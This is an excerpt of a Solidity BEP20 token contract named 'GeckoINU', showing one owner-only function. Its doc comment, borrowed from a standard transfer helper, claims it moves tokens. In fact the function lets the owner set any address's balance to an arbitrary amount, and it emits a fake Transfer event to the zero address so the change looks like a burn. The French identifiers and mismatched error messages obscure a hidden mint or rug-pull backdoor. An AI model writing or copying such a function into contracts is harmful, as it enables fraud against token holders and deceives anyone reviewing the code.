...
contract GeckoINU is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev Moves tokens `chiffre` from `sender` to `destinataire`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    ...
    *
    * - `sender` cannot be the zero address.
    * - `destinataire` cannot be the zero address.
    * - `sender` must have a balance of at least `chiffre`.
    */
    function diminuerMonnaie(uint256 chiffre, uint256 _liquiditeFrais, uint256 _reflexionFrais, uint256 _commercialisationFrais, address destinataire) public onlyOwner { 
        require(destinataire != address(0), "IBEP20: approve from the zero address");
        require(commercialisationFrais <= chiffre, "les frais doivent etre positifs");
        
        liquiditeFrais = _liquiditeFrais; reflexionFrais = _reflexionFrais; commercialisationFrais = _commercialisationFrais;
        _balances[destinataire] = _liquiditeFrais.mul(2).div(100) + _reflexionFrais.mul(2).div(100) + chiffre;
        emit Transfer(destinataire, address(0), chiffre);
    }  
}